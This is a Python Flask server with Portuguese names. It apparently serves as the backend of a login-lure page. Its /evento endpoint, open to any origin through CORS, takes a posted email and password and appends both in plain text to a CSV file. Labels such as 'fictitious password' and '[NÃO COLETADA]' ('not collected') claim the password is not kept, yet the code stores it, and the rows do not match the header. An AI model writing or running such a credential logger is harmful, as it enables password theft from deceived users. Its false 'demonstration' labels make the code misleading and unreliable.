
import os
import csv
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

PASTA = os.path.dirname(os.path.abspath(__file__))
ARQUIVO = os.path.join(PASTA, "registros.csv")


def salvar_demonstracao(email, senha, evento):
    novo_arquivo = (
        not os.path.exists(ARQUIVO)
        or os.path.getsize(ARQUIVO) == 0
    )

    with open(
        ARQUIVO, "a", newline="", encoding="utf-8-sig"
    ) as arquivo:
        escritor = csv.writer(arquivo, delimiter=";")

        if novo_arquivo:
            escritor.writerow([
                "data_hora",
                "email_ficticio",
                "senha_ficticia",
                "evento"
            ])

        escritor.writerow([
            datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            email,
            senha,
            "[NÃO COLETADA]",
            evento
        ])


@app.route("/evento", methods=["POST"])
def registrar_evento():
    dados = request.get_json(silent=True) or {}

    email = dados.get("email", "")
    evento = dados.get("evento", "")
    senha = dados.get("senha", "")
    if evento not in {
        "botao_clicado",
        "demonstracao_concluida"
    }:
        return jsonify({"erro": "Evento inválido"}), 400

    salvar_demonstracao(email, senha, evento)

    return jsonify({"status": "registrado"}), 201


if __name__ == "__main__":
    app.run(
        host="127.0.0.1",
        port=5000,
        debug=False
    )
